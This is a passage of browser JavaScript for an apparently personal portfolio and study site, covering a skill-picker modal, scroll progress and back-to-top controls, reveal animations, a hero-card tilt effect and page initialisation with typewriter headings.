              <h4 class="picker-item-title">${escape(proj.title)}</h4>
              <p class="picker-item-sub">${escape(proj.tagline)}</p>
            </div>
            <span class="picker-item-badge">${isCurrent ? 'You are here' : 'Open →'}</span>
          </a>`;
      }).join('');
    }
    picker.classList.add('open');
    picker.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }

  function closePicker() {
    if (!picker) return;
    picker.classList.remove('open');
    picker.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  // Use event delegation so dynamically injected tool cards (rendered
  // AFTER setupSkillPicker runs) still receive clicks.
  document.addEventListener('click', (e) => {
    const card = e.target.closest('.tool-card[data-projects]');
    if (!card) return;
    e.preventDefault();
    const skillName = card.querySelector('h3')?.textContent || 'Skill';
    const ids = (card.dataset.projects || '').split(',').map(s => s.trim()).filter(Boolean);
    const href = card.getAttribute('href') || '#';

    if (typeof console !== 'undefined') console.log('[skill-card]', { skillName, ids, onProjectPage });

    if (ids.length > 1) {
      // Shared skill — open the picker so user can switch
      openPicker(skillName, ids);
    } else if (onProjectPage) {
      // Already on a project page and this skill only lives here → toast
      Toast.show(`${skillName} is already covered by the project you're viewing.`, 'info');
    } else {
      // On index page — navigate to that single project's page
      window.location.href = href;
    }
  });

  // When the user clicks a picker item that targets the project they're already on,
  // don't reload — just show a toast and close the picker.
  if (picker) {
    picker.addEventListener('click', (e) => {
      const item = e.target.closest('.picker-item');
      if (!item || !picker.contains(item)) return;
      const toolsGrid = $('#toolsGrid');
      const currentProjectId = toolsGrid ? toolsGrid.dataset.currentProject : null;
      if (currentProjectId && item.dataset.id === currentProjectId) {
        e.preventDefault();
        closePicker();
        const skillName = (titleEl && titleEl.textContent || '').split(' - ')[0].trim() || 'This skill';
        Toast.show(`${skillName} is already covered by the project you're viewing.`, 'info');
      }
    });
  }

  if (picker) {
    closeBtn?.addEventListener('click', closePicker);
    picker.addEventListener('click', (e) => { if (e.target === picker) closePicker(); });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && picker.classList.contains('open')) closePicker();
    });
  }
}

/* ---------- Doc Pages: Study Progress + Scroll-to-Top ----------
   Runs on python.html / linux.html / netsec.html / ai.html.
   - Fills #progressFill / #progressText based on how far the page
     has been scrolled (0% at top, 100% at bottom).
   - Toggles the .visible class on #scrollTopBtn so the button
     actually appears once the user has scrolled down a bit.
   Works with both scroll events (desktop mouse-wheel/trackpad) and
   touch scrolling on mobile since both fire the same 'scroll' event. */
function setupDocProgressAndScrollTop() {
  const progressFill = document.getElementById('progressFill');
  const progressText = document.getElementById('progressText');
  const scrollTopBtn = document.getElementById('scrollTopBtn');

  if (!progressFill && !progressText && !scrollTopBtn) return;

  const SHOW_AFTER_PX = 300; // show back-to-top button after scrolling this far
  let ticking = false;

  function update() {
    ticking = false;

    // How far down the page we are, as a percentage
    const scrollTop = window.scrollY || document.documentElement.scrollTop || 0;
    const docHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
    const percent = docHeight > 0 ? Math.min(100, Math.max(0, Math.round((scrollTop / docHeight) * 100))) : 0;

    if (progressFill) progressFill.style.width = percent + '%';
    if (progressText) progressText.textContent = percent + '%';

    if (scrollTopBtn) {
      scrollTopBtn.classList.toggle('visible', scrollTop > SHOW_AFTER_PX);
    }
  }

  function onScroll() {
    if (!ticking) {
      window.requestAnimationFrame(update);
      ticking = true;
    }
  }

  window.addEventListener('scroll', onScroll, { passive: true });
  window.addEventListener('resize', onScroll);
  update(); // set correct state immediately on load
}

/* ---------- Reveal on Scroll ----------
   Fixes elements permanently stuck at opacity:0 (.reveal in style.css
   requires a .visible class that was never being added anywhere). */
function setupRevealAnimations() {
  const items = document.querySelectorAll('.reveal');
  if (!items.length) return;

  if (!('IntersectionObserver' in window)) {
    items.forEach(el => el.classList.add('visible'));
    return;
  }

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        observer.unobserve(entry.target);
      }
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });

  items.forEach(el => observer.observe(el));
}

/* ---------- Hero Tilt (index page) ----------
   CSS already sets transform-style:preserve-3d + a transform transition
   on #heroCard, but nothing was ever driving the transform on mousemove. */
function setupHeroTilt() {
  const card = document.getElementById('heroCard');
  if (!card) return;

  const maxTilt = 8; // degrees

  card.addEventListener('mousemove', (e) => {
    const rect = card.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;  // 0..1
    const y = (e.clientY - rect.top) / rect.height;   // 0..1
    const rotateY = (x - 0.5) * 2 * maxTilt;
    const rotateX = (0.5 - y) * 2 * maxTilt;
    card.style.transform = `perspective(900px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
  });

  card.addEventListener('mouseleave', () => {
    card.style.transform = 'perspective(900px) rotateX(0deg) rotateY(0deg)';
  });
}

/* ---------- Init ---------- */
document.addEventListener('DOMContentLoaded', () => {
  const yearEl = document.getElementById('year');
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  setupSmoothScroll();
  setupLightbox();
  setupSkillPicker();
  setupGlobalUIToggles();
  setupRevealAnimations();
  setupHeroTilt();
  updateActiveNav();
  populateNetLabMenu();
  handleGlobalSearch();
  checkUserSession();

  // Doc Page Specifics
  const page = document.documentElement.getAttribute('data-page');
  if (['python', 'linux', 'netsec', 'ai'].includes(page)) {
    setupDocProgressAndScrollTop();
  }
  if (page === 'doc') {
    initTypewriter(["Python", "Linux", "AI & ML", "Networking", "Cybersecurity", "Cloud"], 'typewriter');
  } else if (page === 'network_lab') {
    initTypewriter(["VLANs", "DHCP", "Static Routing", "ACLs", "NAT / PAT", "DNS"], 'typewriter');
  } else if (page === 'index') {
    initTypewriter(["Python Developer", "Linux Enthusiast", "AI & ML Explorer", "Network & Security"], 'typeText');
  }

  if ($('#projectsGrid')) renderProjectsIndex();
  if ($('#projectTitle') || document.body.classList.contains('page-project')) renderProjectPage();
});
